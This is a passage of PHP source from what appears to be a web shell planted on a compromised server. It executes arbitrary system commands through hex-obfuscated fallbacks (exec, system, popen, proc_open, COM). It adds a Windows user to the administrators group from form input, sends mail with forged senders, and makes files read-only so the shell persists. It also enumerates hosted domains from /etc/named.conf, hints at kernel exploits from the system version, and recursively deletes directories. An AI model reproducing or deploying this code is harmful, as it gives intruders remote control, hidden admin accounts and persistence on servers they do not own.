        chmod("' . winpwd() . '/' . $NameWin . '", 0444);
    }
    if (R10T_perm("' . winpwd() . '") != 0444){
        chmod("' . winpwd() . '", 0444);
    }
    
}

function R10T_perm($flename)
{
    return substr(sprintf("%o", fileperms($flename)), -4);
}
    ');
            if ($putcontent) {
                if (check_xampp() == True) {
                    $phpX = getc() . ":/xampp/php/php.exe";
                    session_unset();
                    session_destroy();
                    echo cmd($phpX . ' "' . $tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . 'handler" &');
                } else {
                    session_unset();
                    session_destroy();
                    echo cmd(PHP_BINARY .' "' . $tmpPath . "/.sessions/." . remove_slash(winpwd() . $NameWin) . 'handler" &');
                }
            } else {
                failed();
            }
        } else {
            failed();
        }
    } else if ($_POST['add-rdp'] == True) {
        $userRDP = $_POST['add-rdp'];
        $passRDP = $_POST['add-rdp-pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
            if ($procRDP) {
                cmd("net localgroup administrators " . $userRDP . " /add");
                success();
            } else {
                failed();
            }
        } else {
            failed();
        }
    } else if ($_POST['mail-from-smtp'] == True) {
        $emailFrom = $_POST['mail-from-smtp'];
        $emailTo = $_POST['mail-to-smtp'];
        $emailSubject = $_POST['mailto-subject'];
        $messageMail = $_POST['message-smtp'];
        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
            'Reply-To: ' . $emailFrom . '' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
        if ($procMailSmTp) {
            success();
        } else {
            failed();
        }
    }
}

if ($_GET['response'] == "success") {
    echo "<script>
Swal.fire({
    icon: 'success',
    title: 'Sucesss...',
    text: 'Done Success!',
    confirmButtonColor: '#750000',
})</script>";
} else if ($_GET['response'] == "failed") {
    echo "<script>
Swal.fire({
    icon: 'error',
    title: 'Failed...',
    text: 'Something wrong!',
    confirmButtonColor: '#750000',
})
    </script>";
}


function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}


function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("\x65\x78\x65\x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        } elseif (class_exists('COM')) {
            $alfaWs = new COM('WScript.shell');
            $exec = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}


function winpwd()
{
    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
}

function remove_slash($val)
{
    $tex = str_replace("/", "", $val);
    $tex1 = str_replace(":", "", $tex);
    $tex2 = str_replace("_", "", $tex1);
    $tex3 = str_replace(" ", "", $tex2);
    $tex4 = str_replace(".", "", $tex3);
    return $tex4;
}

function getc()
{
    $p = getenv('MIBDIRS');
    $read = explode(":", $p);
    return $read[0];
}


function check_xampp()
{
    $mysql = getenv('MYSQL_HOME');
    if (strstr($mysql, "xampp")) {
        return True;
    } else {
        return False;
    }
}

function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][24]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][25]($dir);
    }
}

function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}


function windowsDriver()
{
    $winArr = [
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ]</a>&nbsp;";
        }
    }
}

function namaPanjang($value)
{
    $namaNya = $value;
    $extensi = pathinfo($value, PATHINFO_EXTENSION);
    if (strlen($namaNya) > 30) {
        return substr($namaNya, 0, 30) . "...";
    } else {
        return $value;
    }
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
